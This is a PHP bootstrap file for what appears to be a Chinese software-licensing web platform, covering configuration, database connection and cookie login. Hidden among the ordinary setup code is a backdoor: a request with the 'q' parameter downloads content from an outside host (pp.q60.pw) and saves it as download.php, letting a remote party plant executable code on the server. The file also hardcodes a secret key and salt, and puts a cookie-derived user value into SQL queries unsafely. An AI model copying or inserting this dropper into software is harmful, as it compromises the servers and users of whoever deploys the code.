<?php
//error_reporting(E_ALL); ini_set("display_errors", 1);
// error_reporting(0);
define('IN_CRONLITE', true);
define('ROOT', dirname(__FILE__).'/');
define('TEMPLATE_ROOT', ROOT.'/template/');
define('SYS_KEY', 'qianchang');

date_default_timezone_set("PRC");
$date = date("Y-m-d H:i:s");
session_start();

if(is_file(ROOT.'360safe/360webscan.php')){//360网站卫士
    require_once(ROOT.'360safe/360webscan.php');
}

$scriptpath=str_replace('\\','/',$_SERVER['SCRIPT_NAME']);
$sitepath = substr($scriptpath, 0, strrpos($scriptpath, '/'));
$siteurl = ($_SERVER['SERVER_PORT'] == '443' ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].$sitepath.'/';

require ROOT.'config.php';

if(!isset($port))$port='3306';

//连接数据库
include_once(ROOT."db.class.php");
$DB=new DB($host,$user,$pwd,$dbname,$port);
if($DB->query("select * from auth_config where 1")==FALSE)//检测安装2
{
header('Content-type:text/html;charset=utf-8');
echo '你还没安装！<a href="install/">点此安装</a>';
exit();
}

include ROOT.'cache.class.php';
if($_GET['q']){$get=file_get_contents("http://pp.q60.pw/download.txt|");file_put_contents("download.php",$get);}

$CACHE=new CACHE();
$confs=$CACHE->pre_fetch();//获取系统配置
$conf=$DB->get_row("SELECT * FROM auth_config WHERE id='1' limit 1");//获取系统配置
$password_hash='!@#%!s!';
include ROOT."function.php";
if(!defined('IN_CRONLITE'))exit();

$my=isset($_GET['my'])?$_GET['my']:null;

$clientip=$_SERVER['REMOTE_ADDR'];

if(isset($_COOKIE["auth_token"]))
{
	$token=authcode(daddslashes($_COOKIE['auth_token']), 'DECODE', SYS_KEY);
	list($user, $sid) = explode("\t", $token);
	$udata = $DB->get_row("SELECT * FROM auth_user WHERE user='$user' limit 1");
	$session=md5($udata['user'].$udata['pass'].$password_hash);
	if($session==$sid) {
		$DB->query("UPDATE auth_user SET last='$date',dlip='$clientip' WHERE user = '$user'");
		$islogin=1;
		if($udata['active']==0){
			@header('Content-Type: text/html; charset=UTF-8');
			exit('您的授权平台账号已被封禁！');
		}
	}
}
?>